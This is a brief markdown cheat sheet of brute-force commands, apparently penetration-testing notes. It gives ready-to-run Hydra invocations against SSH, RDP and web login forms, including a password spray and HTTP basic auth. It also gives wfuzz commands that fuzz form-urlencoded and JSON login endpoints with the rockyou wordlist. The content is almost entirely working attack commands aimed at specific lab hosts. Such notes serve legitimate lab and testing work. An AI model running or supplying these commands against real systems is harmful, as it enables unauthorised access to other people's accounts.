# Brute Force

## SSH (Hydra)

```bash
hydra -l george -s 2222 -P /usr/share/wordlists/rockyou.txt 192.168.109.201 ssh
```

---

## RDP Password Spray

```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

---

## Web Form — wfuzz

**Form-urlencoded:**
```bash
wfuzz -u http://192.168.109.201:80/index.php -w /usr/share/wordlists/rockyou.txt -X POST \
  -d "fm_user=user&fm_pwd=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: filemanager=ic30bqm5vou55gfu3pavt8n2bi" \
  --hw 1750
```

**JSON:**
```bash
wfuzz -u http://192.22.174.3:8000/login -w testwordlist.txt -X POST \
  -d '{"email":"admin@secbank.com","password":"FUZZ"}' \
  -H "Content-Type: application/json"
```

---

## Web Form — Hydra

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.109.201 \
  http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

**Basic Auth:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.109.201 http-get
```
